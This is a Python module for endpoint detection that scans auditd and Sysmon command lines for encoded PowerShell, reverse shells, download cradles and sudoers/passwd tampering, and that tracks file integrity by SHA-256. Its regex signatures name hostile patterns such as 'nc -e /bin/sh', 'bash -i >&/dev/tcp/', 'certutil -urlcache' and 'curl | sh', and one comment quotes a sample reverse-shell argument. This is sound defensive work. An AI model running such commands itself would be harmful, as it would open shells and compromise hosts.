"""Endpoint Security Analyzer (X3).

Pluggable capability module analyzing host telemetry for:
1. Living Off The Land Binaries and Scripts (LOLBAS) (MITRE ATT&CK T1059.001, T1105)
2. Interactive Reverse Shell & Command Execution (MITRE ATT&CK T1059.004)
3. Privilege Escalation & Credential Store Tampering (MITRE ATT&CK T1548.003)
4. File Integrity Monitoring (FIM) (MITRE ATT&CK T1565.001) with SHA-256 baseline tracking

Supports Dual Telemetry Ingestion:
- Linux Auditd (type=EXECVE, type=SYSCALL) logs
- Windows Sysmon JSON events (EventID 1: Process Creation, EventID 11: File Creation)

Emits strongly-typed `FindingContract` compliant with `contracts/findings/finding_contract.json`.
"""

from __future__ import annotations

import hashlib
import json
import re
import uuid
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from contracts.python.models import FindingContract, SeverityLevel

# Canonical LOLBAS and malicious command patterns
SUSPICIOUS_CMD_SIGNATURES: list[dict[str, Any]] = [
    {
        "rule_id": "RULE-EDR-PS-001",
        "description_template": "Obfuscated / Encoded PowerShell Command Execution: '{cmd}'",
        "severity": SeverityLevel.HIGH,
        "mitre_attack_id": "T1059.001",
        "regex": re.compile(
            r"(?i)\bpowershell(\.exe)?\s+.*(-e|-enc|-encodedcommand)\s+[A-Za-z0-9+/=]{8,}"
        ),
    },
    {
        "rule_id": "RULE-EDR-REV-001",
        "description_template": "Interactive Reverse Shell Pattern Spawned: '{cmd}'",
        "severity": SeverityLevel.CRITICAL,
        "mitre_attack_id": "T1059.004",
        "regex": re.compile(
            r"(?i)(\b(nc|ncat|netcat)(\.exe)?\s+.*(-e|-c)\s+/(bin/)?(ba)?sh)|(bash\s+-i\s+>&/dev/tcp/)|(python(\d)?\s+-c\s+.*import\s+(socket|pty).*connect)"
        ),
    },
    {
        "rule_id": "RULE-EDR-CRADLE-001",
        "description_template": "Ingress Tool Transfer / Download Cradle Detected: '{cmd}'",
        "severity": SeverityLevel.HIGH,
        "mitre_attack_id": "T1105",
        "regex": re.compile(
            r"(?i)(\bcertutil(\.exe)?\s+.*-(urlcache|split|f)\s+https?://)|(\bbitsadmin(\.exe)?\s+/transfer)|(\bcurl\s+.*\|\s*(ba)?sh)"
        ),
    },
    {
        "rule_id": "RULE-EDR-PRIV-001",
        "description_template": "Privilege Escalation / Credential Store Tampering Attempt: '{cmd}'",
        "severity": SeverityLevel.CRITICAL,
        "mitre_attack_id": "T1548.003",
        "regex": re.compile(
            r"(?i)(\bchmod\s+[0-7]*\s+/etc/(shadow|sudoers))|(\becho\s+.*>>\s*/etc/(sudoers|passwd))|(\bvisudo\b)|(\buseradd\b.*-G\s+(sudo|wheel|root))"
        ),
    },
]


def compute_file_sha256(path: Path | str) -> str:
    """Computes the SHA-256 hex digest of a target file."""
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while chunk := f.read(65536):
            h.update(chunk)
    return h.hexdigest()


class EndpointSecurityAnalyzer:
    """Monitors endpoint telemetry, process lineage, and file integrity."""

    def __init__(self, baseline_snapshot: dict[str, str] | None = None) -> None:
        # In-memory baseline: {path_str: sha256_hash}
        self.fim_baseline: dict[str, str] = baseline_snapshot or {}

    def analyze_command_line(
        self,
        command_line: str,
        host: str = "localhost",
        user: str = "unknown",
        pid: int | None = None,
        parent_pid: int | None = None,
        parent_process: str | None = None,
        timestamp: datetime | None = None,
    ) -> FindingContract | None:
        """Inspects an executed process command line against high-risk LOLBAS signatures."""
        ts = timestamp or datetime.now(UTC)
        cmd_clean = command_line.strip()

        for sig in SUSPICIOUS_CMD_SIGNATURES:
            if sig["regex"].search(cmd_clean):
                desc = sig["description_template"].format(cmd=cmd_clean[:120])
                evidence = {
                    "command_line": cmd_clean,
                    "user": user,
                    "host": host,
                    "pid": pid,
                    "parent_pid": parent_pid,
                    "parent_process": parent_process,
                }
                return FindingContract(
                    finding_id=uuid.uuid4(),
                    tool_name="endpoint_security",
                    rule_id=sig["rule_id"],
                    severity=sig["severity"],
                    target=host,
                    description=desc,
                    evidence=evidence,
                    timestamp=ts,
                    mitre_attack_id=sig["mitre_attack_id"],
                )
        return None

    def initialize_fim_baseline(self, target_paths: list[Path | str]) -> int:
        """Scans specified files and initializes the SHA-256 baseline state."""
        indexed_count = 0
        for p in target_paths:
            path = Path(p)
            if path.is_file():
                try:
                    self.fim_baseline[str(path.resolve())] = compute_file_sha256(path)
                    indexed_count += 1
                except (PermissionError, OSError):
                    continue
            elif path.is_dir():
                for subfile in path.glob("**/*"):
                    if subfile.is_file():
                        try:
                            self.fim_baseline[str(subfile.resolve())] = compute_file_sha256(subfile)
                            indexed_count += 1
                        except (PermissionError, OSError):
                            continue
        return indexed_count

    def check_file_integrity(
        self,
        host: str = "localhost",
        timestamp: datetime | None = None,
    ) -> list[FindingContract]:
        """Compares current file state on disk against initialized baseline."""
        ts = timestamp or datetime.now(UTC)
        findings: list[FindingContract] = []

        for path_str, expected_hash in list(self.fim_baseline.items()):
            p = Path(path_str)
            if not p.exists():
                findings.append(
                    FindingContract(
                        finding_id=uuid.uuid4(),
                        tool_name="endpoint_security",
                        rule_id="RULE-EDR-FIM-002",
                        severity=SeverityLevel.HIGH,
                        target=host,
                        description=f"Monitored Security File Deleted: '{path_str}'",
                        evidence={
                            "path": path_str,
                            "expected_sha256": expected_hash,
                            "status": "DELETED",
                            "host": host,
                        },
                        timestamp=ts,
                        mitre_attack_id="T1565.001",
                    )
                )
                continue

            try:
                current_hash = compute_file_sha256(p)
                if current_hash != expected_hash:
                    findings.append(
                        FindingContract(
                            finding_id=uuid.uuid4(),
                            tool_name="endpoint_security",
                            rule_id="RULE-EDR-FIM-001",
                            severity=SeverityLevel.CRITICAL,
                            target=host,
                            description=f"File Integrity Tampering Detected: '{path_str}' modified",
                            evidence={
                                "path": path_str,
                                "expected_sha256": expected_hash,
                                "current_sha256": current_hash,
                                "status": "MODIFIED",
                                "host": host,
                            },
                            timestamp=ts,
                            mitre_attack_id="T1565.001",
                        )
                    )
            except (PermissionError, OSError):
                continue

        return findings

    def export_baseline_snapshot(self, output_path: Path | str) -> None:
        """Exports in-memory baseline state to a JSON file for persistence."""
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(self.fim_baseline, f, indent=2)

    def import_baseline_snapshot(self, input_path: Path | str) -> int:
        """Loads baseline state from a JSON snapshot file."""
        with open(input_path, encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                self.fim_baseline.update({str(k): str(v) for k, v in data.items()})
                return len(self.fim_baseline)
        return 0

    def parse_auditd_line(self, line: str, host: str = "linux-host") -> FindingContract | None:
        """Parses a Linux auditd type=EXECVE log line."""
        line = line.strip()
        if not line or "type=EXECVE" not in line:
            return None

        # Extract arguments: a0="...", a1="...", a2="..."
        # Example: type=EXECVE msg=audit(1700000000.123:456): argc=3 a0="bash" a1="-i" a2=">&/dev/tcp/10.0.0.1/4444"
        arg_matches = re.findall(r'a\d+=(?:"([^"]*)"|(\S+))', line)
        if not arg_matches:
            return None

        args = [m[0] or m[1] for m in arg_matches]
        cmd_line = " ".join(args)

        # Extract pid if available
        pid_match = re.search(r"pid=(\d+)", line)
        pid = int(pid_match.group(1)) if pid_match else None

        # Extract uid if available
        uid_match = re.search(r"uid=(\d+)", line)
        user = f"uid:{uid_match.group(1)}" if uid_match else "unknown"

        return self.analyze_command_line(cmd_line, host=host, user=user, pid=pid)

    def parse_sysmon_record(self, record: dict[str, Any]) -> FindingContract | None:
        """Parses a structured Windows Sysmon EventID 1 (Process Create) event record."""
        event_data = record.get("EventData", record)
        event_id = str(record.get("EventID") or event_data.get("EventID", "1"))

        if event_id != "1":
            return None

        cmd_line = (
            event_data.get("CommandLine")
            or event_data.get("command_line")
            or event_data.get("Image", "")
        )
        if not cmd_line:
            return None

        host = record.get("Computer") or event_data.get("Computer") or "windows-host"
        user = event_data.get("User") or event_data.get("user") or "unknown"
        pid = int(event_data.get("ProcessId", 0)) or None
        parent_pid = int(event_data.get("ParentProcessId", 0)) or None
        parent_image = event_data.get("ParentImage")

        return self.analyze_command_line(
            cmd_line,
            host=host,
            user=user,
            pid=pid,
            parent_pid=parent_pid,
            parent_process=parent_image,
        )

    def parse_log_line(self, line: str, host: str = "host-01") -> FindingContract | None:
        """Universal router parsing either JSON (Sysmon) or key-value (Auditd) lines."""
        line = line.strip()
        if not line:
            return None

        if line.startswith("{"):
            try:
                record = json.loads(line)
                return self.parse_sysmon_record(record)
            except json.JSONDecodeError:
                return None

        return self.parse_auditd_line(line, host=host)
